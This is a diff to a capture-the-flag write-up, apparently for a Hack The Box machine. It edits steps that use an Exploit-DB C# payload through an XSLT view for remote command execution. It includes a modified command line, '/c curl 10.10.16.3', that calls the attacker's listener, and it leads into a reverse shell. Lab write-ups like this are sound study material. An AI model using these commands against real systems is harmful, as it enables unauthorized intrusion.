@@ -179,13 +179,14 @@ Export list for 10.10.10.180:
 ```
 
 - I've got this payload from [exploit db](https://www.exploit-db.com/exploits/49488)
-- And changed few parts like `string cmd = "/c curl 10.10.16.3"` and `proc.StartInfo.FileName = "cmd.exe";`
+- This payload uses c sharp script to execute commands
+- I've changed few parts like `string cmd = "/c curl 10.10.16.3"` and `proc.StartInfo.FileName = "cmd.exe";`
 - After pasting this click `view xslt` button again
 
 ![](https://i.imgur.com/rtq8YrZ.png)
 
 - Here we got a hit in our server
-- And you can see the output in the window behind that terminal, `.bashrc` are my local files
+- And you can see the output in the window behind that terminal, `.bash_history` and `.bashrc_orginal` are my local files
 - Now let's try to get a reverse shell
 
 ```xml
